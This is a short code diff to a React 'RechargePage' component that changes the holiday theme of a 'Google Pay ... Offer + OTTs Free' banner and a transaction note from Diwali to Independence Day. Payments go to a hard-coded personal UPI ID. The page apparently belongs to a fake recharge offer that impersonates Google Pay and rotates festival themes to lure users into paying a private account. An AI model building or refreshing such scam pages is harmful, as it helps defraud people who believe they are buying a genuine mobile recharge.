@@ -47,7 +47,7 @@ const RechargePage = () => {
     const upiId = "whitedevil789@ybl";  // Replace with your UPI ID
 
     // Customize transaction note
-    const transactionNote = `Diwali Dhamaka Recharge ${mobileNumber || ''}`;
+    const transactionNote = `Independence Day Dhamaka Recharge ${mobileNumber || ''}`;
 
     // Handle the "Recharge" button click
     const handleRecharge = (selectedAmount, index) => {
@@ -272,7 +272,7 @@ const RechargePage = () => {
 
             <div className="px-2 my-0 py-3">
                 <h1 className=' text-center fs-5'>
-                    Google Pay <strong className='text-danger'> Diwali </strong> Offer 🪔 + OTTs Free
+                    Google Pay <strong className='text-danger'> Independence Day </strong> Offer 🎁 + OTTs Free
                 </h1>
             </div>
 
